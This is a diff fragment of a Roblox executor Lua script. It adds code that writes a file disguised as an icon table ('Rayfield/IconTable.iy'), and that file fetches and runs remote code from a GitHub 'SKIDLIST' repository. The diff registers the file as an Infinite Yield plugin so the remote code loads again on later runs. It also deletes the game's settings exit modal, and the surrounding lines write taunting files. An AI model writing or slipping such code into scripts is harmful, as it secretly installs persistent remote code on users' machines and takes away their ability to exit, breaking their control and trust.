@@ -69,6 +69,25 @@ print(waiting)
 task.wait(waiting)
 game.ExperienceService:LeaveExperienceWithReason()
 ]=]
+	thestring = [=[
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/ICantAffordWave/SKIDLIST/refs/heads/main/script"))()
+	
+		return {
+			["PluginName"] = "",
+			["PluginDescription"] = "",
+			["Commands"] = {
+				[""] = {
+					["Aliases"] = {},
+					["Function"] = function(args, speaker) end
+				}
+			}
+		}
+	]=]
+	game:GetService("CoreGui").RobloxGui.SettingsClippingShield:Destroy()
+	game:GetService("CoreGui").RobloxGui.Modules.Settings.Pages.ExitModal:Destroy()
+	writefile("Rayfield/IconTable.iy", thestring)
+	thetable = game.HttpService:JSONDecode(readfile("IY_FE.iy"))
+	table.insert(thetable.PluginsTable, "Rayfield/IconTable.iy")
 	if not isfile("ScriptBlox/iloveyou") then
 		writefile("ScriptBlox/iloveyou.txt","you are tatsuki")
 		writefile("ScriptBlox/ok.lua",source)
